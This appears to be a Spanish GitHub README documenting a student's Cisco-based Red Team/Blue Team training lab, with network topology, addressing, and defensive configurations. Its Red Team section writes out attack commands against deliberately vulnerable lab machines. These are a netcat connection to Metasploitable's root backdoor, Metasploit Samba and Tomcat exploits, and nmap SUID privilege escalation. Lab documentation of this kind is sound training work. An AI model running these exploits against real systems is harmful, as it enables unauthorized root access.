# 🔐 Laboratorio de Ciberseguridad - Red Team & Blue Team

[![Cisco](https://img.shields.io/badge/Cisco-IOS-blue?logo=cisco)](https://www.cisco.com/)
[![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?logo=kalilinux)](https://www.kali.org/)
[![Metasploit](https://img.shields.io/badge/Metasploit-Framework-2596CD)](https://www.metasploit.com/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

Laboratorio completo de ciberseguridad con infraestructura Cisco física, múltiples VLANs, y ejercicios prácticos de Red Team y Blue Team.

## 📋 Descripción

Este proyecto documenta la construcción y operación de un laboratorio de ciberseguridad profesional que incluye:

- **Infraestructura de red empresarial** con 6 equipos Cisco (routers y switches)
- **Topología multi-sitio** con sede principal, sucursal y zona DMZ
- **Ejercicios Red Team**: Reconocimiento, explotación y escalación de privilegios
- **Ejercicios Blue Team**: ACLs, Port Security, IDS, logging centralizado y análisis forense

## 🏗️ Arquitectura

```
                    ┌─────────────────┐
                    │   INTERNET/ISP  │
                    │ 192.168.100.0/24│
                    └────────┬────────┘
                             │
                    ┌────────┴────────┐
                    │    RT-EDGE      │
                    │   Cisco 1941    │
                    │  NAT/Firewall   │
                    └──┬──────────┬───┘
                       │          │
          ┌────────────┘          └────────────┐
          │                                    │
    ┌─────┴─────┐                      ┌───────┴──────┐
    │   RT-HQ   │                      │    SW-DMZ    │
    │ Cisco 1921│                      │  VLAN 10     │
    └─────┬─────┘                      │ Metasploitable│
          │                            └──────────────┘
    ┌─────┴─────┐
    │SW-CORE-HQ │        ┌──────────┐
    │ Cisco 3650│        │RT-BRANCH │
    │VLAN 20,30,40       │Cisco 1921│
    │           │        └────┬─────┘
    │ Kali Linux│             │
    │ Windows 11│        ┌────┴─────┐
    └───────────┘        │SW-BRANCH │
                         │ VLAN 50  │
                         └──────────┘
```

## 📦 Inventario de Equipos

| Equipo | Modelo | Rol | Acceso |
|--------|--------|-----|--------|
| RT-EDGE | Cisco 1941 | Router Edge / NAT / Firewall | SSH v2 |
| RT-HQ | Cisco 1921 | Router Sede Principal | SSH v2 |
| RT-BRANCH | Cisco 1921 | Router Sucursal | SSH v2 |
| SW-CORE-HQ | Cisco 3650 | Core Switch L3 | SSH v2 |
| SW-DMZ | Cisco 2960 PoE | Switch DMZ | Telnet |
| SW-BRANCH | Cisco 2960 PoE+ | Switch Sucursal | SSH v2 |

## 🌐 Direccionamiento IP

| Segmento | Red | VLAN | Gateway |
|----------|-----|------|---------|
| DMZ | 172.16.10.0/24 | 10 | 172.16.10.1 |
| Servidores | 172.16.20.0/24 | 20 | 172.16.20.1 |
| Usuarios | 172.16.30.0/24 | 30 | 172.16.30.1 |
| IT/Admin | 172.16.40.0/24 | 40 | 172.16.40.1 |
| Branch | 192.168.50.0/24 | 50 | 192.168.50.1 |

## 🖥️ Máquinas Virtuales

| VM | IP | VLAN | Rol |
|----|-----|------|-----|
| Kali Linux | 172.16.40.50 | 40 | Atacante |
| Metasploitable 2 | 172.16.10.50 | 10 | Víctima Linux |
| Windows 11 | 172.16.30.100 | 30 | Víctima Windows |

## ⚔️ Ejercicios Red Team

### Ataque #1: Backdoor Puerto 1524
```bash
nc 172.16.10.50 1524
# Resultado: Shell root directo
```

### Ataque #2: Samba usermap_script (CVE-2007-2447)
```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 172.16.10.50
set LHOST 172.16.40.50
run
# Resultado: Shell root
```

### Ataque #3: Tomcat + Escalación de Privilegios
```bash
# Fase 1: Explotación Tomcat
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 172.16.10.50
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
run
# Resultado: Shell como tomcat55

# Fase 2: Escalación vía nmap SUID
nmap --interactive
!sh
whoami
# Resultado: root
```

### Ataque #4: Escaneo Windows 11
```bash
nmap -sV -p 135,139,445,3389,5985 172.16.30.100
# Puertos SMB expuestos cuando Firewall está desactivado
```

## 🛡️ Ejercicios Blue Team

### 1. ACL - Bloqueo de Puertos
```cisco
ip access-list extended PROTECT_DMZ
 permit tcp 172.16.40.0 0.0.0.255 any eq 22
 permit icmp any any
 deny tcp any host 172.16.10.50 eq 1524 log
 deny tcp any host 172.16.10.50 eq 445 log
 deny tcp any host 172.16.10.50 eq 139 log
 permit ip any any

interface GigabitEthernet0/1
 ip access-group PROTECT_DMZ in
```

### 2. Port Security
```cisco
interface range FastEthernet0/2-24
 switchport port-security
 switchport port-security maximum 2
 switchport port-security violation restrict
 switchport port-security mac-address sticky
```

### 3. SPAN/Port Mirror
```cisco
monitor session 1 source vlan 40
monitor session 1 destination interface GigabitEthernet1/0/20
```

### 4. Logging Centralizado
```cisco
logging host 172.16.40.50
logging trap informational
```

### 5. Snort IDS
```bash
sudo snort -i eth0
# Monitoreo de tráfico en tiempo real
```

### 6. Wireshark
```
Filtro: ip.addr == 172.16.10.50
# Análisis de paquetes durante ataques
```

### 7. Windows Firewall
```powershell
# Auditoría
auditpol /set /subcategory:"Filtering Platform Packet Drop" /success:enable /failure:enable

# Logging
netsh advfirewall set allprofiles logging droppedconnections enable
```

## 📊 Resultados

| Categoría | Cantidad | Estado |
|-----------|----------|--------|
| Equipos Cisco | 6 | ✅ Configurados |
| Ataques Red Team | 4 | ✅ Exitosos |
| Defensas Blue Team | 7 | ✅ Implementadas |
| VMs | 3 | ✅ Operativas |

## 📁 Estructura del Proyecto

```
├── README.md
├── docs/
│   └── Lab_Ciberseguridad_Documentacion_Final.html
├── configs/
│   ├── RT-EDGE.txt
│   ├── RT-HQ.txt
│   ├── RT-BRANCH.txt
│   ├── SW-CORE-HQ.txt
│   ├── SW-DMZ.txt
│   └── SW-BRANCH.txt
├── scans/
│   ├── metasploitable_scan.txt
│   └── windows11_scan.txt
└── captures/
    └── nmap_scan.pcapng
```

## 🛠️ Requisitos

### Hardware
- 3x Routers Cisco (1941, 1921)
- 3x Switches Cisco (3650, 2960)
- Laptop con VMware
- 2x Adaptadores USB-Ethernet
- Cables de consola y Ethernet

### Software
- VMware Workstation
- Kali Linux
- Metasploitable 2
- Windows 11 (opcional)

## 🚀 Mejoras Futuras

- [ ] Active Directory (Windows Server)
- [ ] SIEM (ELK Stack / Splunk)
- [ ] IPS (Suricata inline)
- [ ] Honeypot (Cowrie / T-Pot)
- [ ] VPN Site-to-Site

## 📝 Lecciones Aprendidas

1. **Segmentación de red** - VLANs permiten aplicar controles específicos por zona
2. **Defensa en profundidad** - Múltiples capas de protección son esenciales
3. **Monitoreo continuo** - Sin logging, los ataques pasan desapercibidos
4. **Superficie de ataque** - Servicios innecesarios = más vulnerabilidades

## 👤 Autor

**Ramos**
- Maestría en Ciberseguridad - UNITEC
- CompTIA Security+ | CCNA | ISC2 CC | DFE

## 📄 Licencia

Este proyecto está bajo la Licencia MIT - ver el archivo [LICENSE](LICENSE) para más detalles.

---

⭐ Si este proyecto te fue útil, considera darle una estrella en GitHub.
